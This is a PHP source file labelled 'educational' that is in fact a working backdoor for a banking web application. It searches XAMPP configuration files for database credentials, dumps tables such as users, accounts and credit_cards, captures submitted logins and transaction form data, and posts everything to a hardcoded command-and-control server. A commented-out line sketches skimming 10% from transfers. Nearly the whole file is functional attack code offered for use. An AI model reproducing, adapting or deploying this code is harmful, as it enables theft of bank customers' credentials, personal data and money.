<?php
// EDUCATIONAL PURPOSES ONLY - Banking Application Hijacker
// This file would be placed in the web application directory to intercept transaction data

// C2 Server configuration
$c2_server = "192.168.20.200";
$c2_port = "8080";
$c2_endpoint = "http://{$c2_server}:{$c2_port}/";

// Log file for debugging (makes it easier for forensic investigation to find)
$log_file = dirname(__FILE__) . "/debug_log.txt";

// Function to communicate with C2 server
function send_to_c2($data) {
    global $c2_endpoint, $log_file;
    
    try {
        // Convert data to JSON
        $json_data = json_encode($data);
        
        // Send data to C2 server
        $options = [
            'http' => [
                'header' => "Content-type: application/json\r\n",
                'method' => 'POST',
                'content' => $json_data,
                'timeout' => 10
            ]
        ];
        
        $context = stream_context_create($options);
        $result = file_get_contents($c2_endpoint, false, $context);
        
        // Log the result for debugging
        file_put_contents($log_file, date('Y-m-d H:i:s') . " - Data sent: " . substr($json_data, 0, 100) . "...\n", FILE_APPEND);
        
        return $result;
    } catch (Exception $e) {
        // Log errors
        file_put_contents($log_file, date('Y-m-d H:i:s') . " - Error: " . $e->getMessage() . "\n", FILE_APPEND);
        return false;
    }
}

// Function to steal database credentials from XAMPP configuration
function steal_db_credentials() {
    // Common paths to look for database configuration
    $possible_paths = [
        'C:/xampp/htdocs/bank_app/config.php',
        'C:/xampp/htdocs/bank_app/includes/config.php',
        'C:/xampp/htdocs/bank_app/includes/db.php',
        'C:/xampp/htdocs/config/database.php',
        'C:/xampp/htdocs/application/config/database.php' // CodeIgniter path
    ];
    
    $credentials = [];
    
    foreach ($possible_paths as $path) {
        if (file_exists($path)) {
            // Read the file content
            $content = file_get_contents($path);
            
            // Extract potential database credentials using regex
            preg_match('/[\'"]hostname[\'"]\\s*=>?\\s*[\'"](.+?)[\'"]/', $content, $host_matches);
            preg_match('/[\'"]username[\'"]\\s*=>?\\s*[\'"](.+?)[\'"]/', $content, $user_matches);
            preg_match('/[\'"]password[\'"]\\s*=>?\\s*[\'"](.+?)[\'"]/', $content, $pass_matches);
            preg_match('/[\'"]database[\'"]\\s*=>?\\s*[\'"](.+?)[\'"]/', $content, $db_matches);
            
            if (!empty($host_matches) || !empty($user_matches)) {
                $credentials = [
                    'file_path' => $path,
                    'hostname' => $host_matches[1] ?? 'localhost',
                    'username' => $user_matches[1] ?? '',
                    'password' => $pass_matches[1] ?? '',
                    'database' => $db_matches[1] ?? ''
                ];
                break;
            }
        }
    }
    
    return $credentials;
}

// Function to dump database tables
function dump_database($credentials) {
    if (empty($credentials)) {
        return false;
    }
    
    try {
        // Connect to the database
        $conn = new mysqli($credentials['hostname'], $credentials['username'], $credentials['password'], $credentials['database']);
        
        if ($conn->connect_error) {
            return false;
        }
        
        // Get all tables
        $tables = [];
        $result = $conn->query("SHOW TABLES");
        while ($row = $result->fetch_array()) {
            $tables[] = $row[0];
        }
        
        $database_dump = [];
        
        // Focus on sensitive tables
        $sensitive_tables = ['users', 'customers', 'accounts', 'transactions', 'payments', 'credit_cards'];
        $tables_to_dump = array_intersect($tables, $sensitive_tables);
        
        if (empty($tables_to_dump) && !empty($tables)) {
            // If no sensitive tables found, take the first 3 tables
            $tables_to_dump = array_slice($tables, 0, 3);
        }
        
        // Dump each table
        foreach ($tables_to_dump as $table) {
            $rows = [];
            $result = $conn->query("SELECT * FROM {$table} LIMIT 50");
            while ($row = $result->fetch_assoc()) {
                $rows[] = $row;
            }
            $database_dump[$table] = $rows;
        }
        
        $conn->close();
        
        return [
            'db_dump' => [
                'database_name' => $credentials['database'],
                'tables' => $database_dump
            ]
        ];
    } catch (Exception $e) {
        return false;
    }
}

// Function to intercept transaction data
function intercept_transaction($post_data) {
    // Extract transaction details
    $transaction_data = [
        'transaction_data' => [
            'timestamp' => date('Y-m-d H:i:s'),
            'form_data' => $post_data,
            'server_data' => $_SERVER
        ]
    ];
    
    // Send to C2
    send_to_c2($transaction_data);
    
    // Maybe even modify the transaction amount or destination
    if (isset($post_data['amount']) && is_numeric($post_data['amount'])) {
        // For simulation, we'll just log the theft
        $modified_amount = $post_data['amount'];
        $stolen_amount = $modified_amount * 0.1; // Steal 10%
        
        file_put_contents(__DIR__ . "/debug_log.txt", date('Y-m-d H:i:s') . " - Intercepted transaction: Original Amount: {$post_data['amount']}, Stolen: {$stolen_amount}\n", FILE_APPEND);
        
        // You could change the POST data here to modify the transaction
        // $_POST['amount'] = $modified_amount - $stolen_amount;
    }
}

// Function to steal login credentials
function intercept_login($post_data) {
    // Extract login details
    $login_data = [
        'bank_credentials' => [
            'timestamp' => date('Y-m-d H:i:s'),
            'credentials' => $post_data
        ]
    ];
    
    // Send to C2
    send_to_c2($login_data);
}

// Only execute if this is a web request
if (php_sapi_name() !== 'cli') {
    // Initialize
    file_put_contents($log_file, date('Y-m-d H:i:s') . " - Backdoor initialized\n", FILE_APPEND);
    
    // Steal database credentials
    $db_credentials = steal_db_credentials();
    if (!empty($db_credentials)) {
        send_to_c2(['hostname' => gethostname(), 'db_credentials' => $db_credentials]);
        
        // Dump database
        $db_dump = dump_database($db_credentials);
        if ($db_dump) {
            send_to_c2($db_dump);
        }
    }
    
    // Intercept POST data
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        // Look for login forms
        if (isset($_POST['username']) && isset($_POST['password'])) {
            intercept_login($_POST);
        }
        
        // Look for transaction forms
        if (isset($_POST['amount']) || isset($_POST['transaction_id']) || isset($_POST['account_number'])) {
            intercept_transaction($_POST);
        }
    }
}
